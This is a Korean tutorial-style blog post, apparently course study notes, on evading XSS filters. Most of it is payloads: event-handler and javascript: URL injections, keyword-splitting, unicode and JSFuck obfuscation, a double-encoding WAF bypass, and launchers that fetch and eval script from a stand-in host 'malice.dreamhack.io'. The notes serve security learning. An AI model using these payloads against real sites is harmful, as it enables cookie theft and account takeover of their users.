---
title: "[2025-07-28] XSS Filtering Bypass"
excerpt: "XSS Filtering Bypass"

categories:
  - Justice
tags:
  - [XSS]

permalink: /Justice/[2025-07-28] XSS Filtering Bypass/

toc: true
toc_sticky: true

date: 2025-07-28
last_modified_at: 2025-07-30
---

## 🦥 본문

## 불충분한 XSS 필터링

### 이벤트 핸들러 속성

이벤트 핸들러 : 이벤트를 처리하기 위한 콜백 형태의 핸들러 함수 

- onload : 데이터가 로드한 후 실행
- onerror : 데이터를 로드하는데 실패할 시 실행
- onfocus : 커서를 클릭하여 포커스가 되면 실행
    - autofocus : 자동으로 포커스
    
    ```python
    <input type="text" id="inputID" 
           onfocus="alert(document.domain)" 
           autofocus>
    
    //해시 기반 자동 포커스
    http://dreamhack.io/#inputID URL의 #으로 접근하면 포커스
    ```
    

### 문자열 치환

- 필터링 우회

```python
(x => x.replace(/onerror/g, ''))('<img oneonerrorrror=promonerrorpt(1)>')
--> <img onerror=prompt(1) />
```

→ 문자열에 변화가 없을 때까지 지속적으로 치환하는 방식

```python
function replaceIterate(text) {
    while (true) {
        var newText = text
            .replace(/script|onerror/gi, '');
        if (newText === text) break;
        text = newText;
    }
    return text;
}
replaceIterate('<imgonerror src="data:image/svg+scronerroriptxml,&lt;svg&gt;" onloadonerror="alert(1)" />')
--> <img src="data:image/svg+xml,&lt;svg&gt;" onload="alert(1)" />
replaceIterate('<ifronerrorame srcdoc="&lt;sonerrorcript&gt;parent.alescronerroriptrt(1)&lt;/scrionerrorpt&gt;" />')
--> <iframe srcdoc="&lt;&gt;parent.alert(1)&lt;/&gt;" />
```

하지만 미처 고려하지 못한 구문의 존재, WAF 방어 무력화는 동일 

### 활성 하이퍼링크

- `javascript:` 스키마는 URL 로드시 자바스크립트 코드 실행
    
    ```python
    <a href="javascript:alert(document.domain)">Click me!</a>
    <iframe src="javascript:alert(document.domain)">
    ```
    
- 브라우저가 URL을 처리할 때 정규화 과정 우회
    
    ```python
    <a href="\1\4jAVasC\triPT:alert(document.domain)">Click me!</a>
    <iframe src="\1\4jAVasC\triPT:alert(document.domain)">
    ```
    
    - `\x01`, `\x04` , `\t` 같은 특수문자 제거
    - 대소문자 통일
- HTML Entity Encoding 우회
    
    ```python
    <a href="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">Click me!</a>
    <iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">
    ```
    

→ URL 객체를 통해 직접 정규화하여 테스트할 수 있음

- protocol, hostname 등 URL 정보 추출 가

```html
function normalizeURL(url) {
    return new URL(url, document.baseURI);
}
normalizeURL('\4\4jAva\tScRIpT:alert(1)').href
--> "javascript:alert(1)"
normalizeURL('\4\4jAva\tScRIpT:alert(1)').protocol
--> "javascript:"
normalizeURL('\4\4jAva\tScRIpT:alert(1)').pathname
--> "alert(1)"
```

### 태그와 속성 기반 필터링

- 대/소문자 검사 미흡
- 잘못된 정규표현식
    - EX) 스크립트 태그 내에 데이터가 존재-검사 정규식과 우회 방법
        
        ```html
        x => !/<script[^>]*>[^<]/i.test(x)
        <script src="data:,alert(document.cookie)"></script>
        ```
        
    - EX2) `img` 태그에 `on` 이벤트 핸들러 존재 검사 정규식과 우회 방법
        
        ```html
        x => !/<img.*on/i.test(x)
        //줄바꿈 문자를 이용한 우회 
        <img src=""\nonerror="alert(document.cookie)"/>
        ```
        
    - EX3) `script`, `img`, `input` 태그 검사 및 우회
        
        ```html
        x => !/<script|<img|<input/i.test(x)
        //다른 태그를 이용한 우회
        <video><source onerror="alert(document.domain)"/></video>
        <body onload="alert(document.domain)"/>
        ```
        
    - EX4) on 이벤트 핸들러 검사 및 멀티 라인 검사와 우회 방법
        
        ```html
        x => !/<script|<img|<input|<.*on/is.test(x)
        //iframe을 통한 우회
        <iframe src="javascript:alert(parent.document.domain)">
        <iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
        ```
        

### 자바스크립트 함수 및 키워드 필터링

- Unicode escape sequence 우회: `“\uAC00” == “가”` 처럼 유니코드 문자를 코드포인트로 나타낼 수 있는 표현법을 통한 우회

```html
var foo = "\u0063ookie";  // cookie
var bar = "cooki\x65";  // cookie
\u0061lert(document.cookie);  // alert(document.cookie)
```

- Computed member access 우회 : 특정 속성에 접근할 때 속성 이름을 동적으로 계산하는 기능

```html
alert(document["\u0063ook" + "ie"]);  // alert(document.cookie)
window['al\x65rt'](document["\u0063ook" + "ie"]);  // alert(document.cookie)
```

- 키워드 필터링 우회

| **구문** | **대체 구문** |
| --- | --- |
| `alert`, `XMLHttpRequest` 등 문서 최상위 객체 및 함수 | `window['al'+'ert']`, `window['XMLHtt'+'pRequest']` 등 이름 끊어서 쓰기 |
| `window` | `self`, `this` |
| `eval(code)` | `Function(code)()` |
| `Function` | `isNaN['constr'+'uctor']` 등 함수의 `constructor` 속성 접근 |
- `[` , `]` , `(` , `)` , `!` , `+` 을 이용하여 자바스크립트의 동작 수행 가능

```html
alert(1)
->
[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+[+!+[]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]])
false => ![]
true => !![]
```

+ https://jsfuck.com/

- 문자열
    - 템플릿 리터럴 : `[` , `]` , `(` , `)` , `“`, `‘` 이 필터링되어 있을 때 문자열 리터럴. 백틱(``` )으로 감싸서 문자열 정의. 변수나 식을 `${}` 안에 넣어 문자열 중간에 삽입 가능
        
        ```html
        var foo = "Hello";
        var bar = "World";
        var baz = `${foo},
        ${bar} ${1+1}.`; // "Hello,\nWorld 2."
        ```
        
    - RegExp 객체 사용 : RegExp 객체 생성하고 객체의 패턴 부분을 가져와서 문자열 생성 가능
    
    ```html
    var foo = /Hello World!/.source;  // "Hello World!"
    var bar = /test !/ + [];  // "/test !/"
    ```
    
    - String.fromCharCode 함수 사용
    
    ```html
    var foo = String.fromCharCode(72, 101, 108, 108, 111);  // "Hello"
    ```
    
    - 기본 내장 함수나 객체의 문자 사용 : `toString` 함수를 이용해 문자열로 변환
    
    ```html
    
    //history.toString() => [object History] 반환
    var baz = history.toString()[8] + // "H"
    
    //산술 연산 시 객체 내부적으로 문자열 변환
    (history+[])[9] + // "i"
    
    //URL.toString() => function URL(){[native code]} 반환
    (URL+0)[12] + // "("
    (URL+0)[13]; // ")" ==> "Hi()"
    ```
    
    - 숫자 객체의 진법 변환 : 아스키 코드를 이용. 문법 에러를 피하기 위해 괄호, 점 두개, 공백과 점을 이용
    
    ```html
    var foo = (29234652).toString(36); // "hello"
    var foo = 29234652..toString(36); // "hello"
    var bar = 29234652 .toString(36); // "hello"
    ```
    
- 함수 호출 : 함수 호출을 위해서는 소괄호 또는 백틱 사용.
    
    ```html
    alert(1); // Parentheses
    alert`1`; // Tagged Templates
    ```
    
    - `javascript:` 스키마를 이용한 location 변경
        
        ```html
        location="javascript:alert\x28document.domain\x29;";
        location.href="javascript:alert\u0028document.domain\u0029;";
        location['href']="javascript:alert\050document.domain\051;";
        ```
        
    - `Symbol.hasInstance` 오버라이딩 : `Symbol.hasInstance` well-known symbol을 이용하면 `instanceof` 연산자를 오버라이드
        - Symbol : 원시 데이터 타입. 유일하고 변경 불가능한 값 생성
        
        ```html
        "alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
        Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
        ```

    - `document.body.innerHTML` 추가 : 문서 내 새로운 HTML 코드 추가 가능. 하지만 `<sciprt>` 태그는 삽입해도 실행 불가
    
        ```html
        document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
        document.body.innerHTML+="<body src=x: onload=alert&#40;1&#41;>";
        ```

### 디코딩 전 필터링

더블 인코딩 : 애플리케이션에서 전달받은 데이터를 다시 디코딩해서 사용하는 경우 발생. 웹 방화벽의 검증 우회 가능

- 동작 흐름 예시
    1. 공격자가 더블 URL 인코딩한 공격 코드 `%253Cscript%253E…` 
    2. 웹 방화벽이 해당 데이터를 디코딩 후 검증. 디코딩한 결과 `%253Cscript%253E…` 안전하다고 판단
    3. 애플리케이션이 해당 데이터를 디코딩하여 `<script>` 를 게시판 DB에 저장
    4. 희생자가 해당 게시글을 읽으면 XSS 발생

더블 디코딩 : 애플리케이션 검증 로직 이후에도 디코딩을 하는 경우 발생.

- EX)
    
    ```html
    
    <?php
    $query = $_GET["query"];
    if (stripos($query, "<script>") !== FALSE) {
        header("HTTP/1.1 403 Forbidden");
        die("XSS attempt detected: " . htmlspecialchars($query, ENT_QUOTES|ENT_HTML5, "UTF-8"));
    }
    ...
    $searchQuery = urldecode($_GET["query"]);
    ?>
    <h1>Search results for: <?php echo $searchQuery; ?></h1>
    
    //공격 실패 예시
    POST /search?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
    ...
    -----
    HTTP/1.1 403 Forbidden
    XSS attempt detected: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
    
    //더블 인코딩을 통한 공격 성공
    POST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/1.1
    ...
    -----
    HTTP/1.1 200 OK
    <h1>Search results for: <script>alert(document.cookie)</script></h1>
    ```
    

### 길이 제한

길이 제한의 경우, 다른 경로로 실행할 추가적인 코드(payload)를 URL fragment로 삽입 후, 삽입 지점에서 본 코드를 실행하는 짧은 코드 (launcher)를 사용 가능

- Fragment로 스크립트를 넘겨준 후 XSS 지점에서 `location.hash`로 URL의 Fragment 부분을 추출하여 `eval()`로 실행하는 기법
    
    ```html
    https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie); 
    ```
    
- 쿠키에 페이로드를 저장하는 방식
- `import` 같은 외부 자원을 스크립트로 로드하는 방식
    
    ```html
    import("http://malice.dreamhack.io");
    
    var e = document.createElement('script')
    e.src='http://malice.dreamhack.io';
    document.appendChild(e);
    
    fetch('http://malice.dreamhack.io').then(x=>eval(x.text()))
    ```